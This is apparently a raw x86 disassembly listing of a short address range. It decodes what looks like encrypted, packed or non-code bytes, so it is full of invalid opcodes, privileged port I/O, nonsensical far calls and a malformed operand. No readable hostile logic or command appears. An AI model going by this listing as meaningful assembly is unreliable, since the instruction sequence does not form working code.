  40f447:	add    DWORD PTR [ecx+0x79],0xffffffd3
  40f44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f44c:	enter  0xe451,0xa0
  40f450:	(bad)  
  40f451:	stos   DWORD PTR es:[edi],eax
  40f452:	fadd   QWORD PTR [esp+eax*1-0x60]
  40f456:	jl     0x40f453
  40f458:	pop    esi
  40f459:	call   FWORD PTR [edi]
  40f45b:	xchg   esp,eax
  40f45c:	gs hlt 
  40f45e:	addr16 je 0x40f4ce
  40f461:	pop    ebp
  40f462:	mov    ebp,0x3e47bff
  40f467:	or     al,0xce
  40f469:	inc    edi
  40f46a:	cmp    ebp,DWORD PTR [ecx+0x5e]
  40f46d:	std    
  40f46e:	mov    WORD PTR [ebx+0x4b0bb810],fs
  40f474:	sub    BYTE PTR [esi+0x2d],dl
  40f477:	icebp  
  40f478:	mov    bh,0xcc
  40f47a:	push   0xee8acd3b
  40f47f:	cmc    
  40f480:	add    ebx,0x7eb91726
  40f486:	and    eax,0x3a0912f4
  40f48b:	(bad)  
  40f48c:	xor    DWORD PTR [edi+0x517485ee],edx
  40f492:	loope  0x40f50c
  40f494:	add    al,0x2b
  40f496:	out    dx,al
  40f497:	cs pop edi
  40f499:	shr    DWORD PTR [edi],0x43
  40f49c:	sub    al,0xd1
  40f49e:	call   0xa28f:0xb3a5ee72
  40f4a5:	push   edx
  40f4a6:	daa    
  40f4a7:	and    ecx,ebp
  40f4a9:	xchg   BYTE PTR [eax+0xa],ah
  40f4ac:	les    ebx,FWORD PTR [edx-0x3ea15023]
  40f4b2:	and    ah,ch
  40f4b4:	and    ecx,esi
  40f4b6:	(bad)  
  40f4b7:	and    DWORD PTR [ecx+eiz*1-0x5],ebp
  40f4bb:	mov    al,ds:0x5512c2e6
  40f4c0:	fdiv   DWORD PTR [ebp+0x2c]
  40f4c3:	adc    DWORD PTR [ecx-0x62],edx
  40f4c6:	inc    esi
  40f4c7:	or     eax,0xd32ab79e
  40f4cc:	ins    BYTE PTR es:[edi],dx
  40f4cd:	test   al,0x1f
  40f4cf:	mov    eax,ds:0xf4fd28ac
  40f4d4:	and    esi,esp
  40f4d6:	in     eax,dx
  40f4d7:	dec    ebp
  40f4d8:	pop    esi
  40f4d9:	mov    cl,0x6e
  40f4db:	inc    ebp
  40f4dc:	pop    edx
  40f4dd:	and    eax,0x5c32bc8e
  40f4e2:	loopne 0x40f4e0
  40f4e4:	mov    bl,dl
  40f4e6:	out    dx,eax
  40f4e7:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40f4e9:	psubq  mm3,QWORD PTR ds:0xc997b891
  40f4f0:	jb     0x40f4da
  40f4f2:	dec    eax
  40f4f3:	add    al,0x5e
  40f4f5:	mov    dh,0xd0
  40f4f7:	adc    eax,0x2109a373
  40f4fc:	outs   dx,DWORD PTR ds:[esi]
  40f4fd:	pusha  
  40f4fe:	cs xchg edx,edi
  40f501:	mov    ecx,0xc791c37c
  40f506:	out    dx,al
  40f507:	fwait
  40f508:	std    
  40f509:	lock cmp esi,eax
  40f50c:	in     eax,0x80
  40f50e:	mov    edx,0xa5625f82
  40f513:	xor    bl,dh
  40f515:	xor    al,0x8d
  40f517:	pop    ebp
  40f518:	imul   DWORD PTR [ebp+ecx*2-0x40b1a2b9]
  40f51f:	push   esi
  40f520:	cmpxchg DWORD PTR [edi+0xa2088c5],eax
  40f527:	inc    eax
  40f528:	jo     0x40f58a
  40f52a:	(bad)
  40f52d:	repz pop ebp
  40f52f:	dec    esp
  40f530:	cmp    eax,0x4fa9dd65
  40f535:	fld    DWORD PTR [eax+0x14]
  40f538:	pop    esi
  40f539:	xor    al,ah
  40f53b:	jp     0x40f540
  40f53d:	in     al,dx
  40f53e:	test   eax,0x74224ea0
  40f543:	mov    dh,0x1b
  40f545:	(bad)  
  40f546:	push   ebx
  40f547:	fs push esp
  40f549:	pop    edi
  40f54a:	sahf   
  40f54b:	xor    bl,BYTE PTR [esi-0x54]
  40f54e:	pop    ebx
  40f54f:	push   es
  40f550:	and    al,0xf6
  40f552:	jns    0x40f4f5
  40f554:	(bad)  
  40f555:	adc    edi,DWORD PTR ds:0x87e6d77d
  40f55b:	cmp    ah,BYTE PTR [eax+eax*1-0x45]
  40f55f:	push   ebx
  40f561:	inc    esp
  40f562:	addr16 or eax,0x224df11b
  40f568:	call   0xc961:0x55c9324b
  40f56f:	dec    eax
  40f570:	ret    0x773e
  40f573:	or     ch,0x66
  40f576:	and    ax,0x7e5f
  40f57a:	sar    BYTE PTR [ecx-0x1f],cl
  40f57d:	int3   
  40f57e:	rdtsc  
  40f580:	imul   esi,esp,0xe2ce8f08
  40f586:	jb     0x40f56c
  40f588:	div    DWORD PTR [esi+0x34]
  40f58b:	push   eax
  40f58c:	scas   al,BYTE PTR es:[edi]
  40f58d:	mov    bh,BYTE PTR ds:0x298e5ed8
  40f593:	clc    
  40f594:	push   edi
  40f595:	add    cl,BYTE PTR [edi+0x2f]
  40f598:	fs push ebx
  40f59a:	or     dh,dh
  40f59c:	lods   eax,DWORD PTR ds:[esi]
  40f59d:	cld    
  40f59e:	cs popf 
  40f5a0:	sahf   
  40f5a1:	test   al,0xdd
  40f5a3:	bound  ebx,QWORD PTR [esi+0x16]
  40f5a6:	inc    ecx
  40f5a7:	outs   dx,BYTE PTR ds:[esi]
  40f5a8:	xlat   BYTE PTR ds:[ebx]
  40f5a9:	adc    DWORD PTR [ecx+0x405fffc7],edi
  40f5af:	jmp    0xb77735d4
  40f5b4:	sub    BYTE PTR [ebp+0x40b60531],dh
  40f5ba:	out    dx,al
  40f5bb:	mov    ds,WORD PTR [eax-0x24]
  40f5be:	stos   BYTE PTR es:[edi],al
  40f5bf:	mov    edi,0x8e2a2e59
  40f5c4:	ret    0xd833
  40f5c7:	pusha  
  40f5c8:	shl    DWORD PTR [esp+ebp*8-0x118a5d50],1
  40f5cf:	jg     0x40f57c
  40f5d1:	test   al,0x63
  40f5d3:	adc    esp,DWORD PTR [eax]
  40f5d5:	ja     0x40f5c6
  40f5d7:	mov    al,ds:0x833dc056
  40f5dc:	mul    DWORD PTR [esi+ebx*1]
  40f5df:	dec    esi
  40f5e0:	pop    esi
  40f5e1:	clc    
  40f5e2:	push   ecx
  40f5e3:	out    0x76,al
  40f5e5:	dec    ebp
  40f5e6:	jne    0x40f5e1
  40f5e8:	imul   edx,DWORD PTR [ecx-0x9],0xf627fd7
  40f5ef:	push   ebp
  40f5f0:	jle    0x40f645
  40f5f2:	popa   
  40f5f3:	nop    DWORD PTR [eax-0x19]
  40f5f7:	add    al,0xf5
  40f5f9:	mov    ch,0x83
  40f5fb:	dec    ecx
  40f5fc:	into   
  40f5fd:	sub    al,0x28
  40f5ff:	adc    BYTE PTR [edx+0x7230f45d],dh
  40f605:	mov    ebx,0xbf96f9a7
  40f60a:	mov    cl,0xb5
  40f60c:	pop    esi
  40f60d:	outs   dx,BYTE PTR ds:[esi]
  40f60f:	lea    esi,[ebp+ebx*1+0x66374280]
  40f616:	pop    ebp
  40f617:	xchg   edi,eax
  40f618:	fidiv  WORD PTR [eax+edi*2-0x55]
  40f61c:	call   0x5edfd6a2
  40f621:	sbb    al,0xb2
  40f623:	out    dx,eax
  40f624:	xsaveopt [edi+0xa]
  40f628:	shl    BYTE PTR [eax-0x17],0x8e
  40f62c:	and    edx,edx
  40f62e:	mov    edi,0xee3221fa
  40f633:	icebp  
  40f634:	popa   
  40f635:	mov    eax,0x9c8e176b
  40f63a:	mov    eax,gs:0x8be5c901
  40f640:	mov    bl,0xb2
  40f642:	rcl    BYTE PTR [ebp+ebx*2+0x71],0x9
  40f647:	jno    0x40f5fb
  40f649:	xchg   BYTE PTR [esi],al
  40f64b:	push   edi
  40f64c:	jle    0x40f685
  40f64e:	push   ss
  40f64f:	mov    eax,ds:0xd661025b
  40f654:	lods   al,BYTE PTR ds:[esi]
  40f655:	push   eax
  40f656:	and    eax,DWORD PTR [ecx]
  40f658:	pop    esi
  40f659:	inc    eax
  40f65a:	xlat   BYTE PTR ds:[ebx]
  40f65b:	cli    
  40f65c:	loope  0x40f663
  40f65e:	jmp    0x40f694
  40f660:	mov    bl,0x60
  40f662:	push   0x97535329
  40f667:	sub    bl,BYTE PTR [ecx+0x7]
  40f66a:	(bad)
  40f66f:	or     eax,0x31cd20e0
  40f674:	push   edi
  40f675:	leave  
  40f676:	xor    al,ch
  40f678:	dec    esi
  40f679:	mov    ah,0xb
  40f67b:	mov    ecx,0xd4a360c4
  40f680:	dec    esp
  40f681:	adc    esi,DWORD PTR [esi-0x5d]
  40f684:	in     eax,dx
  40f685:	(bad)  
  40f686:	in     eax,dx
  40f687:	(bad)  
  40f688:	inc    eax
  40f689:	jb     0x40f66f
  40f68b:	mov    eax,0xc73ae1ab
  40f690:	int3   
  40f691:	pusha  
  40f692:	pop    edx
  40f693:	pop    ebx
  40f694:	mov    esi,DWORD PTR [esi+0x4d]
  40f697:	sahf   
  40f698:	cmp    ebp,DWORD PTR [edx+0x69a1ceee]
  40f69e:	inc    esp
  40f69f:	sbb    DWORD PTR [ebp-0x33],esp
  40f6a2:	mov    al,0xa0
  40f6a4:	cmp    DWORD PTR [esi-0x18],edi
  40f6a7:	or     cl,dh
  40f6a9:	pushf  
  40f6aa:	pop    dx
  40f6ac:	pop    esi
  40f6ad:	ret    
  40f6ae:	mov    eax,0x177041af
  40f6b3:	lods   al,BYTE PTR ds:[esi]
  40f6b4:	in     al,dx
  40f6b5:	pop    edi
  40f6b6:	pop    ebx
  40f6b7:	or     dh,ah
  40f6b9:	mov    ebx,0x89cc097e
  40f6be:	ss out 0x26,al
  40f6c1:	cmp    al,0xe8
  40f6c3:	inc    ebx
  40f6c4:	sahf   
  40f6c5:	inc    esi
  40f6c6:	pop    DWORD PTR [ebp-0x7c92b18e]
  40f6cc:	pop    ecx
  40f6cd:	loop   0x40f6bd
  40f6cf:	fcom   QWORD PTR [ecx-0x58daa1c6]
  40f6d5:	pusha  
  40f6d6:	sar    esp,1
  40f6d8:	lea    esp,[ebx-0x26149427]
  40f6de:	add    BYTE PTR [ecx],dh
  40f6e0:	sar    DWORD PTR [eax+0x3e5ffc81],0x9a
  40f6e7:	aam    0x8
  40f6e9:	test   al,0x19
  40f6eb:	adc    al,0xa6
  40f6ed:	jmp    0x40f6d6
  40f6ef:	mov    al,ds:0xd12d1c09
  40f6f4:	int    0xdc
  40f6f6:	xlat   BYTE PTR ds:[ebx]
  40f6f7:	addr16 pop esi
  40f6f9:	xchg   edx,eax
  40f6fa:	out    0xbf,al
  40f6fc:	lea    esp,[esi+0x69]
  40f6ff:	aaa    
  40f700:	xor    ah,BYTE PTR [ecx-0x23]
  40f703:	jnp    0x40f6ff
  40f705:	test   DWORD PTR [ebx-0x39119d3b],eax
  40f70b:	inc    esi
  40f70c:	aaa    
  40f70d:	popa   
  40f70e:	jg     0x40f693
  40f710:	das    
  40f711:	mov    ebp,0x558d06c3
  40f716:	mov    BYTE PTR [eax-0x5311763b],0x55
  40f71d:	lods   eax,DWORD PTR ds:[esi]
  40f71e:	aad    0x77
  40f720:	pop    ecx
  40f721:	loop   0x40f6bd
  40f723:	cs jmp 0x58b62591
  40f729:	cli    
  40f72a:	out    dx,eax
  40f72b:	mov    ds:0xf3adebe5,eax
  40f730:	ja     0x40f6fa
  40f732:	xchg   edi,eax
  40f733:	or     DWORD PTR [ebx],0x5f1d95db
  40f739:	push   ebx
  40f73a:	xor    esp,ecx
  40f73c:	dec    ebx
  40f73d:	hlt    
  40f73e:	sub    eax,DWORD PTR [ecx-0xc2d59f2]
  40f744:	jno    0x40f7a6
  40f746:	(bad)  
  40f747:	mov    bh,0x8a
  40f749:	pop    es
  40f74a:	push   edx
  40f74b:	imul   ebp,DWORD PTR [esi+0x6],0xffbbffee
  40f752:	sub    eax,0xfbae4f2
  40f757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f758:	adc    ch,bl
  40f75a:	push   cs
  40f75b:	lods   eax,DWORD PTR ds:[esi]
  40f75c:	dec    ebp
  40f75d:	pop    ss
  40f75e:	outs   dx,BYTE PTR ds:[esi]
  40f75f:	test   DWORD PTR [esi+eax*8],esi
  40f762:	out    dx,al
  40f763:	xchg   edx,eax
  40f764:	test   al,0xb6
  40f766:	inc    ebx
  40f767:	out    dx,al
  40f768:	push   edx
  40f769:	pop    eax
  40f76a:	cmp    ch,BYTE PTR [edi-0xe]
  40f76d:	pusha  
  40f76e:	xchg   edx,eax
  40f76f:	out    dx,eax
  40f770:	lock rcl dh,cl
  40f773:	mov    BYTE PTR [edx],cl
  40f775:	or     ebp,ebp
  40f777:	mov    dl,0xc9
  40f779:	jnp    0x40f7a2
  40f77b:	push   ds
  40f77c:	and    al,0xdc
  40f77e:	cmp    ch,ah
  40f780:	or     BYTE PTR [ecx+0x29],ah
  40f783:	adc    ch,BYTE PTR [eax-0x7b]
  40f786:	mov    esp,0xe75b7192
  40f78b:	dec    edi
  40f78c:	cmp    eax,0xfe8a17ae
  40f791:	and    al,0xe5
  40f793:	sub    al,0xf0
  40f795:	pusha  
  40f796:	jae    0x40f727
  40f798:	or     eax,DWORD PTR [eax]
  40f79a:	dec    esi
  40f79b:	add    ebp,DWORD PTR [ebp-0x714e110e]
  40f7a1:	fs xchg esp,eax
  40f7a3:	mov    bh,0x9
  40f7a5:	pushf  
  40f7a6:	mov    fs,WORD PTR [ecx+0x1f30aba0]
  40f7ac:	sub    bl,BYTE PTR [ebp-0x5c]
  40f7af:	xor    ebx,DWORD PTR [ebx-0x43]
  40f7b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7b3:	dec    esi
  40f7b4:	or     esp,DWORD PTR [ebp+0xad6e2ed]
  40f7ba:	sbb    eax,0x27222e3b
  40f7bf:	mov    eax,ds:0x575f6bdf
  40f7c4:	sub    BYTE PTR [ecx-0x73],dh
  40f7c7:	ret    0x995e
  40f7ca:	(bad)  
  40f7cb:	sbb    esp,DWORD PTR [edx+eax*4+0x615645b2]
  40f7d2:	jg     0x40f7b6
  40f7d4:	cmp    ebp,DWORD PTR [ecx]
  40f7d6:	inc    esp
  40f7d7:	fmul   QWORD PTR [ecx-0x1f]
  40f7da:	in     eax,dx
  40f7db:	(bad)  
  40f7dc:	sbb    ecx,DWORD PTR [ebx+0x3be38d35]
  40f7e2:	fimul  WORD PTR [edi]
  40f7e4:	sbb    ah,BYTE PTR [eax-0x2b]
  40f7e7:	test   ebx,edi
  40f7e9:	into   
  40f7ea:	test   DWORD PTR [esi],0xb399b53f
  40f7f0:	into   
  40f7f1:	cli    
  40f7f2:	out    dx,al
  40f7f3:	cld    
  40f7f4:	add    al,0x9
  40f7f6:	push   esp
  40f7f7:	cmp    eax,0xa62527c5
  40f7fc:	mov    al,0xef
  40f7fe:	mov    WORD PTR [esi],ds
  40f800:	inc    esp
  40f801:	mov    ds:0xed61fc3e,al
  40f806:	das    
  40f807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f808:	jnp    0x40f86c
  40f80a:	cmp    al,0x29
  40f80c:	lods   al,BYTE PTR ds:[esi]
  40f80d:	fldcw  WORD PTR [esi+0x3e]
  40f810:	inc    BYTE PTR [edx]
  40f812:	cmc    
  40f813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f814:	push   edi
  40f815:	rol    BYTE PTR [edi],1
  40f817:	and    DWORD PTR [eax],eax
  40f819:	data16 hlt 
  40f81b:	or     BYTE PTR [esi-0x627e89a0],ch
  40f821:	pop    esi
  40f822:	(bad)  ds:0x6be77020
  40f828:	inc    esi
  40f829:	xor    BYTE PTR [ebx-0x87852a6],dh
  40f82f:	adc    esi,DWORD PTR [edx-0xb]
  40f832:	pop    ebp
  40f833:	mov    eax,ds:0x795954ec
  40f838:	imul   DWORD PTR [ecx-0x70]
  40f83b:	in     eax,dx
  40f83c:	pop    esi
  40f83d:	adc    eax,0x9873d960
  40f842:	and    BYTE PTR [eax-0x11],bl
  40f845:	pusha  
  40f846:	jnp    0x40f8a7
  40f848:	sahf   
  40f849:	mov    esi,0x4b4df9f0
  40f84e:	out    0xf0,al
  40f850:	pop    esi
  40f851:	pushf  
  40f852:	mov    bl,0x56
  40f854:	mov    dl,0x1
  40f856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f858:	loopne 0x40f8ba
  40f85a:	nop
  40f85b:	cdq    
  40f85c:	aam    0x27
  40f85e:	aaa    
  40f85f:	xor    BYTE PTR [edi+0x5e],dl
  40f862:	out    dx,al
  40f863:	es out dx,eax
  40f865:	clc    
  40f866:	sbb    edi,DWORD PTR [ecx-0xe]
  40f869:	pop    ss
  40f86a:	sub    DWORD PTR [ebx+0x3fee0de6],ebp
  40f870:	lods   al,BYTE PTR ds:[esi]
  40f871:	or     DWORD PTR [esi],esp
  40f873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f874:	xor    al,0x84
  40f876:	out    dx,al
  40f877:	mov    ebp,0x57603bff
  40f87c:	sahf   
  40f87d:	imul   ebx,DWORD PTR [ebp-0x5d],0xffffffba
  40f881:	fstp   TBYTE PTR [edi-0x5137ac1c]
  40f887:	in     al,dx
  40f888:	mov    ds:0x5e08482e,eax
  40f88d:	aam    0x7
  40f88f:	add    BYTE PTR [edx],al
  40f891:	dec    ecx
  40f892:	and    DWORD PTR [edi-0xe],ecx
  40f895:	pusha  
  40f896:	inc    ebx
  40f897:	test   BYTE PTR [esi+0x13b47f97],0x76
  40f89e:	out    dx,al
  40f89f:	jmp    0x40f89b
  40f8a1:	jmp    0x14cb677
  40f8a6:	outs   dx,DWORD PTR ds:[esi]
  40f8a7:	mov    ds:0xe24204fe,al
  40f8ac:	arpl   WORD PTR [ebx-0x69567a6a],sp
  40f8b2:	out    dx,al
  40f8b3:	test   al,0x8b
  40f8b5:	in     eax,0xd2
  40f8b7:	scas   al,BYTE PTR es:[edi]
  40f8b8:	int    0xf5
  40f8ba:	mov    cl,0xa0
  40f8bc:	and    esi,ecx
  40f8be:	out    dx,eax
  40f8bf:	dec    esi
  40f8c0:	pop    ebx
  40f8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8c2:	jae    0x40f850
  40f8c4:	pop    edi
  40f8c5:	mov    cl,0x5c
  40f8c7:	sub    al,0xac
  40f8c9:	retf   
  40f8ca:	cmp    ebp,DWORD PTR [ebp-0x75914b2e]
  40f8d0:	jge    0x40f86c
  40f8d2:	xchg   ebp,eax
  40f8d3:	popf   
  40f8d4:	and    al,cl
  40f8d6:	out    0xa8,eax
  40f8d8:	loop   0x40f869
  40f8da:	adc    dh,BYTE PTR [eax+0x54fc941e]
  40f8e0:	push   ss
  40f8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8e2:	xchg   edi,eax
  40f8e3:	lahf   
  40f8e4:	pop    es
  40f8e5:	xor    dl,cl
  40f8e7:	dec    esp
  40f8e8:	adc    al,0xe6
  40f8ea:	pause  
  40f8ec:	sub    esp,eax
  40f8ee:	mov    esi,0x6a0c5e0f
  40f8f3:	add    edi,0x5e
  40f8f6:	call   0xd9b0:0xdb60fe0d
  40f8fd:	push   ecx
  40f8fe:	or     eax,0xee139384
  40f903:	mov    BYTE PTR [ebx],ch
  40f905:	js     0x40f923
  40f907:	into   
  40f908:	lods   al,BYTE PTR ds:[esi]
  40f909:	push   edx
  40f90a:	repz in al,dx
  40f90c:	jbe    0x40f96e
  40f90e:	push   ss
  40f90f:	mov    ebx,0xa9b8e67e
  40f914:	in     eax,dx
  40f915:	sub    ch,0x0
  40f918:	clc    
  40f919:	nop
  40f91a:	(bad)  
  40f91b:	in     al,dx
  40f91c:	repz xchg esp,eax
  40f91e:	into   
  40f91f:	shl    edx,0x60
  40f922:	lods   eax,DWORD PTR ds:[esi]
  40f923:	mov    ds:0x42772301,eax
  40f928:	loope  0x40f995
  40f92a:	out    dx,al
  40f92b:	cs pop esp
  40f92d:	out    0xf8,eax
  40f92f:	or     al,0x1a
  40f931:	inc    ebp
  40f932:	pop    ebx
  40f933:	mov    eax,ds:0x23979ec6
  40f938:	mov    WORD PTR [esi-0x47],?
  40f93b:	or     eax,0x6a60c05e
  40f940:	sub    bh,bl
  40f942:	fidivr WORD PTR [edi]
  40f944:	(bad)  
  40f945:	pop    ecx
  40f946:	xlat   BYTE PTR ds:[ebx]
  40f947:	es push ecx
  40f949:	push   ss
  40f94a:	in     al,dx
  40f94b:	nop
  40f94c:	iret   
  40f94d:	jns    0x40f903
  40f94f:	jne    0x40f9af
  40f951:	dec    ebx
  40f952:	out    0xb2,eax
  40f954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f955:	xchg   esi,eax
  40f956:	jmp    0x40f99d
  40f958:	or     edx,ecx
  40f95a:	push   esi
  40f95b:	mov    eax,ds:0x664dfb64
  40f960:	cmc    
  40f961:	ja     0x40f933
  40f963:	cmp    ebp,ebp
  40f965:	les    ebp,FWORD PTR [esi]
  40f967:	or     edi,ecx
  40f969:	dec    esi
  40f96a:	aaa    
  40f96b:	jbe    0x40f94c
  40f96d:	pusha  
  40f96e:	stos   BYTE PTR es:[edi],al
  40f96f:	push   esi
  40f970:	int    0x3c
  40f972:	ds push edx
  40f974:	les    ebp,FWORD PTR [eax-0x12]
  40f977:	sbb    eax,0x3cbfb17f
  40f97c:	icebp  
  40f97d:	cld    
  40f97e:	mov    BYTE PTR [ecx+0x4925bc3f],ch
  40f984:	fidiv  WORD PTR [edi]
  40f986:	sbb    eax,0xed0319d3
  40f98b:	pop    ebx
  40f98c:	pop    esi
  40f98d:	fmul   QWORD PTR [eax+ebx*2-0x136548e8]
  40f994:	and    DWORD PTR [eax-0x5f],0xffffffab
  40f998:	mov    ebx,0xb8e6e70c
  40f99d:	shl    bh,cl
  40f99f:	dec    esp
  40f9a0:	jns    0x40f9b9
  40f9a2:	adc    ah,dl
  40f9a4:	push   ds
  40f9a5:	inc    eax
  40f9a6:	in     eax,dx
  40f9a7:	pushf  
  40f9a8:	inc    eax
  40f9a9:	popa   
  40f9aa:	sti    
  40f9ab:	int3   
  40f9ac:	push   0x50
  40f9ae:	repz push ecx
  40f9b0:	rol    DWORD PTR [eax-0x12],cl
  40f9b3:	ja     0x40f966
  40f9b5:	call   0xb43df548
  40f9ba:	cdq    
  40f9bb:	test   al,0xba
  40f9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9be:	jno    0x40f9a6
  40f9c0:	jecxz  0x40f9c2
  40f9c2:	hlt    
  40f9c3:	jle    0x40f9f4
  40f9c5:	add    al,0x0
  40f9c7:	and    ebx,ecx
  40f9c9:	and    al,0x6e
  40f9cb:	(bad)  
  40f9cc:	lock (bad) 
  40f9ce:	lock sti 
  40f9d0:	mov    bl,0xb4
  40f9d2:	ret    
  40f9d3:	mov    al,ds:0x19fa9ec1
  40f9d8:	pop    ds
  40f9d9:	mov    esi,0x7960786e
  40f9de:	add    bh,BYTE PTR [edx]
  40f9e0:	retf   0x5806
  40f9e3:	add    BYTE PTR [eax],0xf
  40f9e6:	bound  ebx,QWORD PTR [eax+0x4f]
  40f9e9:	pusha  
  40f9ea:	mov    esi,0xf2bbabcc
  40f9ef:	out    dx,eax
  40f9f0:	popf   
  40f9f1:	jo     0x40fa23
  40f9f3:	leave  
  40f9f4:	jmp    0x40fa34
  40f9f6:	out    dx,al
  40f9f7:	push   ds
  40f9f8:	neg    BYTE PTR [ecx]
  40f9fa:	jmp    0x54757ae3
  40f9ff:	mov    eax,ds:0x659e2b18
  40fa04:	int    0xc3
  40fa06:	lahf   
  40fa07:	add    DWORD PTR [eax+0x62],esp
  40fa0a:	fneni(8087 only) 
  40fa0c:	push   edi
  40fa0d:	adc    DWORD PTR [edi-0x1f],esi
  40fa10:	scas   al,BYTE PTR es:[edi]
  40fa11:	push   eax
  40fa12:	lea    ebp,[eax+0x6a722996]
  40fa18:	mov    eax,fs
  40fa1a:	cmp    DWORD PTR [esi+0x1a],ecx
  40fa1d:	xchg   dh,ch
  40fa1f:	cdq    
  40fa20:	ins    BYTE PTR es:[edi],dx
  40fa21:	mov    ds:0x55576e99,al
  40fa26:	inc    esi
  40fa27:	popf   
  40fa28:	mov    ds:0x6acf62e7,eax
  40fa2d:	mov    al,0xe7
  40fa2f:	push   cs
  40fa30:	push   0x3e4ae3b2
  40fa35:	or     al,0xa
  40fa37:	repz sub DWORD PTR [edx-0x5d],ebx
  40fa3b:	adc    al,0xb2
  40fa3d:	mov    dh,0xd1
  40fa3f:	out    0x67,eax
  40fa41:	icebp  
  40fa42:	js     0x40fa82
  40fa44:	push   0x14
  40fa46:	out    dx,al
  40fa47:	rol    DWORD PTR [eax+0x22],cl
  40fa4a:	aad    0xf2
  40fa4c:	or     eax,DWORD PTR [ebx]
  40fa4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa4f:	mov    eax,ds:0x1b1ba55c
  40fa54:	mov    ds:0x5eafd2e2,eax
  40fa59:	cmp    cl,BYTE PTR [ebp+0x7d]
  40fa5c:	sub    bh,BYTE PTR ds:0x6066edf1
  40fa62:	mov    eax,0xb98ee0e
  40fa67:	mov    ebx,0xcbfa7095
  40fa6c:	push   ebx
  40fa6d:	pushf  
  40fa6e:	jnp    0x40fa69
  40fa70:	and    eax,esi
  40fa72:	xchg   edx,eax
  40fa73:	mov    eax,ds:0xc40102bc
  40fa78:	shl    BYTE PTR [eax+0x31],cl
  40fa7b:	push   edi
  40fa7c:	or     ecx,ebp
  40fa7e:	cli    
  40fa7f:	call   0x2a30e7dc
  40fa84:	add    esi,DWORD PTR [ebp-0x22]
  40fa87:	inc    eax
  40fa88:	jns    0x40fa34
  40fa8a:	push   ds
  40fa8b:	test   al,0x20
  40fa8d:	inc    esp
  40fa8e:	inc    edx
  40fa8f:	sub    edi,DWORD PTR [ebp+0x5e44c8cc]
  40fa95:	call   0x2c3c:0xd3ec65f4
  40fa9c:	pop    esi
  40fa9d:	xlat   BYTE PTR ds:[ebx]
  40fa9e:	ins    BYTE PTR es:[edi],dx
  40fa9f:	push   cs
  40faa0:	add    BYTE PTR [ecx+0x15],ch
  40faa3:	cmc    
  40faa4:	ret    
  40faa5:	pusha  
  40faa6:	adc    BYTE PTR [ebp-0x62],ah
  40faa9:	add    al,0xc3
  40faab:	test   BYTE PTR [edi-0x1b],bh
  40faae:	dec    esp
  40faaf:	pop    eax
  40fab0:	pop    esi
  40fab1:	test   eax,0xd5ac197d
  40fab6:	leave  
  40fab7:	icebp  
  40fab8:	xor    al,0x60
  40faba:	jg     0x40fa59
  40fabc:	or     ebp,esi
  40fabe:	adc    eax,0x8e71d450
  40fac3:	or     bl,bl
  40fac5:	dec    esi
  40fac6:	cwde   
  40fac7:	dec    edx
  40fac8:	stc    
  40fac9:	pusha  
  40faca:	aad    0xff
  40facc:	loope  0x40fabd
  40face:	pop    edx
  40facf:	pop    esp
  40fad0:	pop    esi
  40fad1:	inc    edx
  40fad2:	pop    ebx
  40fad3:	inc    edx
  40fad4:	fimul  WORD PTR [ecx+0x6122efcd]
  40fada:	dec    BYTE PTR [ebx-0x33]
  40fadd:	sbb    ebp,ebx
  40fadf:	lea    edx,ds:0x755e2221
  40fae5:	inc    ebx
  40fae6:	in     al,dx
  40fae7:	pop    esp
  40fae8:	adc    ebx,esp
  40faea:	scas   al,BYTE PTR es:[edi]
  40faeb:	mov    BYTE PTR [edx+0x7a],bl
  40faee:	mov    bl,0x9d
  40faf0:	sub    al,0xa3
  40faf2:	(bad)  
  40faf3:	lahf   
  40faf4:	pushf  
  40faf5:	push   cs
  40faf6:	mov    dl,0x5e
  40faf8:	jle    0x40fabb
  40fafa:	cdq    
  40fafb:	es cmp al,0xa1
  40fafe:	out    dx,al
  40faff:	imul   ecx,DWORD PTR [eax-0x66],0xffffffc8
  40fb03:	fisub  WORD PTR [edx-0x2]
  40fb06:	shl    BYTE PTR [eax+0xce54dec],1
  40fb0c:	in     eax,dx
  40fb0d:	mov    edx,DWORD PTR [esi+edx*4+0x5e]
  40fb11:	dec    ebx
  40fb12:	dec    eax
  40fb13:	pushf  
  40fb14:	popa   
  40fb15:	mov    BYTE PTR [edx],dh
  40fb17:	xchg   ebx,eax
  40fb18:	lahf   
  40fb19:	pusha  
  40fb1a:	xchg   DWORD PTR [edi],ebx
  40fb1c:	out    0xb0,eax
  40fb1e:	in     al,dx
  40fb1f:	scas   al,BYTE PTR es:[edi]
  40fb20:	push   ds
  40fb21:	jge    0x40fb0a
  40fb23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb24:	std    
  40fb25:	into   
  40fb26:	ja     0x40fb78
  40fb28:	mov    fs,WORD PTR [esi+0x4e]
  40fb2b:	jo     0x40fb31
  40fb2d:	pop    ebp
  40fb2e:	push   cs
  40fb2f:	sahf   
  40fb30:	inc    esi
  40fb31:	pop    edi
  40fb32:	das    
  40fb33:	popa   
  40fb34:	mov    esp,esi
  40fb36:	leave  
  40fb37:	data16 (bad) 
  40fb39:	sbb    bl,BYTE PTR ds:[ecx]
  40fb3c:	sub    ecx,edi
  40fb3e:	and    eax,0xb74c13a1
  40fb43:	mov    bl,0x45
  40fb45:	enter  0xf5,0x5e
  40fb49:	adc    DWORD PTR [edx],ebp
  40fb4b:	out    0xa,eax
  40fb4d:	push   edx
  40fb4e:	mov    cs,WORD PTR [edi]
  40fb50:	shl    BYTE PTR [eax-0x21],0x6b
  40fb54:	mov    WORD PTR [eax-0x6615ced8],ds
  40fb5a:	pop    ds
  40fb5b:	daa    
  40fb5c:	mov    ah,0xd1
  40fb5e:	push   edx
